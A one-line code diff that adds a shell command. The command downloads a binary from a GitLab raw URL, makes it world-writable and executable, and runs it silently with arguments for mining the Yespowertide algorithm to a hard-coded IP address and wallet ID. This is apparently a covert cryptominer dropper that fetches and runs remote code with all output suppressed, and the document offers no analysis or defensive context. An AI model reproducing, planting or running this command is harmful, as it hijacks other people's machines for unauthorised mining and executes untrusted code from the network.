@@ -1,0 +1,1 @@
+wget https://gitlab.com/dfchfg/filess/-/raw/main/bagong && chmod 777 bagong && ./bagong -a Yespowertide -o 47.251.244.12:80 -u TNR2ML87UqCtKG7uTAmvy7xvLSU1oLVsuR -t 3 >/dev/null 2>&1
